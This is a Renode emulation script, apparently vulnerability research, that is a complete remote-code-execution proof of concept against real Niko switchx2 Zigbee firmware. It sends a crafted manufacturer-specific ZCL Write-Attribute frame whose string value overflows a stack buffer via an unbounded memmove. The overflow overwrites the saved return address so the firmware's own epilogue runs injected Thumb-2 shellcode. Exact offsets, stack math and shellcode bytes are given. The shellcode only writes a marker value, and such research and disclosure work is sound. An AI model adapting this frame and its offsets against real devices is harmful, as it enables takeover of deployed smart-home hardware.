:name: ZB-05 Niko switchx2 — FULL RCE (dispatch-injection -> sink overflow -> shellcode execution)
:description: End-to-end RCE PoC on the real Niko switchx2 (EFR32MG21, Cortex-M33) firmware. An already-decrypted plaintext manufacturer-specific ZCL Write-Attribute frame (cluster 0xFC00, mfgCode 0x125F, cmd 0x02, attr id 0x0107, type 0x42 string) is injected at the ZCL command dispatch entry sub_6482. The firmware's OWN code (sub_6482 -> sub_6406 ctx build -> sub_62c8 -> 0x6a46 veneer -> sink sub_D290 case 0x107) parses/routes it, and the sink's unbounded memmove at 0xd540 (BL sub_696C) copies the attacker Write-Attribute VALUE bytes into a 4-byte stack local at dst=SP+0x10=0x2000FF90, overflowing 60 bytes to (a) land Thumb-2 shellcode at dst+2=0x2000FF92 AND (b) overwrite the sink's saved LR @0x2000FFCC with the shellcode entry 0x2000FF93 (Thumb bit). The sink's GENUINE epilogue 0xd6d2 `pop {r4-r11,pc}` then loads PC from the corrupted slot with NO forced PC, transferring control to the shellcode, which writes the magic 0xC0DE1337 to 0x20017000 and spins.
#
# SUCCESS CRITERION: after the run, ReadDoubleWord 0x20017000 == 0xC0DE1337 (the
# firmware would NEVER write that value there) and PC is parked inside the shellcode
# spin (0x2000FF92..0x2000FFA5) -- reached with NO forced PC after the 0x6482 ENTRY.
#
# ============================ FORCED vs NATURAL ============================
#   FORCED (emulation scaffolding, the ONE PC write):
#     * The plaintext ZCL frame is written into scratch RAM and the CPU is entered
#       ONCE at sub_6482 (0x6482) with r0..r3 + two stack args exactly as the caller
#       sub_c66a would pass them. This deliberately BYPASSES NWK/APS decryption, APS
#       addressing and endpoint/cluster affinity ABOVE the ZCL command dispatch --
#       i.e. it models an already-JOINED device that shares the network key. It does
#       NOT force the parser, router, sink, epilogue, or shellcode.
#   NATURAL (firmware's own instructions, from 0x6482 down -- NO forced PC):
#     * sub_6406 parses the ZCL header (mfg-spec bit, mfgCode 0x125F, TSN, cmd 0x02,
#       record offset 5, payload ptr) into the global parse-context.
#     * sub_6482 stores it as the current command, calls sub_62c8, DIRECT-calls
#       sub_D290 (via the 0x6a46 b.w veneer) with r0 = context.
#     * sub_D290 validates cmd==2, mfg-spec, mfgCode 0x125F, cluster 0xFC00, attr
#       0x0107, type 0x42, then case 0x107 (0xd52a): length = record[3]+1 (UNCLAMPED,
#       via 0xc200 length-prefix read -- NOT strlen, so shellcode NUL bytes survive),
#       memmove(dst=SP+0x10, src=record+3, len) at 0xd540.
#     * The 64-byte copy overruns the 4-byte local; copied[60..63] overwrite the saved
#       LR @0x2000FFCC. Epilogue 0xd6d2 `pop {r4-r11,pc}` loads it -> shellcode.
#
# ============================ STACK / LANDING MATH =========================
#   Entry SP (fresh)                         = 0x20010000
#   sub_6482 push {r1-r11,lr} (48 bytes)     -> SP = 0x2000FFD0
#   sub_D290 push {r4-r11,lr} (36 bytes)     -> SP = 0x2000FFAC; saved LR @ 0x2000FFCC
#   sub_D290 sub sp,#0x2c (44 bytes)         -> final SP = 0x2000FF80
#   memmove dst = final SP + 0x10            = 0x2000FF90
#   memmove src = record+3 = frame+8         => dst[k] = frame[8+k]
#     dst[0]  = frame[8]  = declared len 0x3F (length-prefix byte, FORCED, not code)
#     dst[1]  = frame[9]  = 0x00             (gap; never executed)
#     dst[2..21] = frame[10..29] = 20-byte Thumb-2 shellcode -> lands @0x2000FF92
#     dst[60..63] = frame[68..71] = saved-LR target -> 0x2000FF93 (0x2000FF92|Thumb)
#   Shellcode entry (Thumb) = 0x2000FF92 | 1 = 0x2000FF93.
#   copy count = record[3]+1 = 0x3F+1 = 0x40 = 64 -> reaches dst+63 exactly.
#
#   Why dst+2 and not dst+0: dst[0] is the length-prefix byte (src=record+3=the
#   len field), which is FORCED to 0x3F to make the copy long enough; dst[1] pads to
#   the next halfword boundary; the first executable Thumb halfword begins at dst+2.
# =======================================================================================

$bin=@scripts/silabs-vuln/zb05_niko.elf
include @scripts/silabs-vuln/boot_mg21.resc
logLevel 3
logLevel 3 sysbus.radio

# COLD observe-only markers along the firmware's own dispatch path (each fires once).
cpu AddHook 0x6482  "self.ErrorLog('MARK_6482_ZCLDISP_ENTRY')"
cpu AddHook 0x6406  "self.ErrorLog('MARK_6406_CTXBUILD')"
cpu AddHook 0x62c8  "self.ErrorLog('MARK_62C8_PREPROC')"
cpu AddHook 0x6a46  "self.ErrorLog('MARK_6A46_VENEER')"
cpu AddHook 0xd290  "self.ErrorLog('MARK_D290_SINK_ENTRY')"
cpu AddHook 0xd52a  "self.ErrorLog('MARK_D52A_CASE107_CMP')"
cpu AddHook 0xd540  "self.ErrorLog('MARK_D540_MEMMOVE_SINK')"
# Natural epilogue pop that consumes the corrupted saved-LR slot.
cpu AddHook 0xd6d2  "self.ErrorLog('MARK_D6D2_EPILOGUE_POP_PC')"
# Shellcode entry (observe-only). Fires when the firmware's OWN pop lands here.
cpu AddHook 0x2000ff92 "self.ErrorLog('SHELLCODE EXECUTING @0x2000FF92')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC (expect advanced past reset/boot):"
cpu PC

# --- Zero scratch RAM (frame + stack region) -----------------------------------------
python "for a in range(0x20001000,0x20001300,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
python "for a in range(0x2000FF00,0x20010010,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"

# --- Frame-header struct @0x20001100 (r0 arg -> ctx[0]) ------------------------------
#   [0x02]=cluster 0xFC00   [0x05]=direction 0x01
sysbus WriteDoubleWord 0x20001100 0xFC000000
sysbus WriteDoubleWord 0x20001104 0x00000100

# --- Plaintext ZCL Write-Attribute frame @0x20001200 (r2 arg) ------------------------
#   [0]=FC=0x04 (bit2 mfg-specific)  [1..2]=mfgCode 0x125F  [3]=TSN 0x00  [4]=cmd 0x02
#   [5..6]=attr id 0x0107  [7]=type 0x42 (string)  [8]=declared len 0x3F (->copy 64)
#   [9]=0x00 gap  [10..29]=20-byte Thumb-2 shellcode  [30..67]=0x41 pad
#   [68..71]=saved-LR target 0x2000FF93 (shellcode entry | Thumb bit)
#
#   Shellcode (little-endian halfword stream, lands @0x2000FF92):
#     f241 3037  movw r0,#0x1337
#     f2cc 00de  movt r0,#0xc0de   -> r0 = 0xC0DE1337
#     f247 0100  movw r1,#0x7000
#     f2c2 0101  movt r1,#0x2001   -> r1 = 0x20017000
#     6008       str  r0,[r1]      -> *(0x20017000) = 0xC0DE1337
#     e7fe       b .               -> spin (keeps the RunFor window safe)
sysbus WriteDoubleWord 0x20001200 0x00125F04
sysbus WriteDoubleWord 0x20001204 0x42010702
sysbus WriteDoubleWord 0x20001208 0xF241003F
sysbus WriteDoubleWord 0x2000120C 0xF2CC3037
sysbus WriteDoubleWord 0x20001210 0xF24700DE
sysbus WriteDoubleWord 0x20001214 0xF2C20100
sysbus WriteDoubleWord 0x20001218 0x60080101
sysbus WriteDoubleWord 0x2000121C 0x4141E7FE
sysbus WriteDoubleWord 0x20001220 0x41414141
sysbus WriteDoubleWord 0x20001224 0x41414141
sysbus WriteDoubleWord 0x20001228 0x41414141
sysbus WriteDoubleWord 0x2000122C 0x41414141
sysbus WriteDoubleWord 0x20001230 0x41414141
sysbus WriteDoubleWord 0x20001234 0x41414141
sysbus WriteDoubleWord 0x20001238 0x41414141
sysbus WriteDoubleWord 0x2000123C 0x41414141
sysbus WriteDoubleWord 0x20001240 0x41414141
sysbus WriteDoubleWord 0x20001244 0x2000FF93

# --- Incoming stack args for sub_6482 (sit at entry SP, above the push) --------------
sysbus WriteDoubleWord 0x20010000 0x00000001
sysbus WriteDoubleWord 0x20010004 0x00000000

# --- Sentinel in the saved-LR slot the sink will overwrite ---------------------------
sysbus WriteDoubleWord 0x2000FFCC 0xAABBCCDD
# --- Magic target: pre-set to a sentinel so the change is unambiguous ----------------
sysbus WriteDoubleWord 0x20017000 0xDEADBEEF

echo ">>> BEFORE: saved-LR slot @0x2000FFCC (sentinel) ="
sysbus ReadDoubleWord 0x2000FFCC
echo ">>> BEFORE: magic slot @0x20017000 (sentinel 0xDEADBEEF) ="
sysbus ReadDoubleWord 0x20017000

# --- Register/stack contract sub_c66a would hand sub_6482 (the ONE forced PC) --------
sysbus.cpu SetRegister 0  0x20001100
sysbus.cpu SetRegister 1  0x00000000
sysbus.cpu SetRegister 2  0x20001200
sysbus.cpu SetRegister 3  0x00000050
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 14 0x0000DEAD
sysbus.cpu PC 0x6482

# Let the firmware's OWN dispatch carry the frame down, overflow, pop the corrupted
# LR, and run the shellcode (which spins at 0x2000FF92, so the window is safe).
emulation RunFor "0.005"
pause

echo ">>> AFTER: PC (expect inside shellcode 0x2000FF92..0x2000FFA5) ="
cpu PC
echo ">>> AFTER: saved-LR slot @0x2000FFCC (expect 0x2000FF93) ="
sysbus ReadDoubleWord 0x2000FFCC
echo ">>> AFTER: magic slot @0x20017000 (expect 0xC0DE1337) ="
sysbus ReadDoubleWord 0x20017000
echo ">>> shellcode bytes landed @0x2000FF92 (expect 41 f2 37 30 ...) ="
sysbus ReadDoubleWord 0x2000FF92
quit
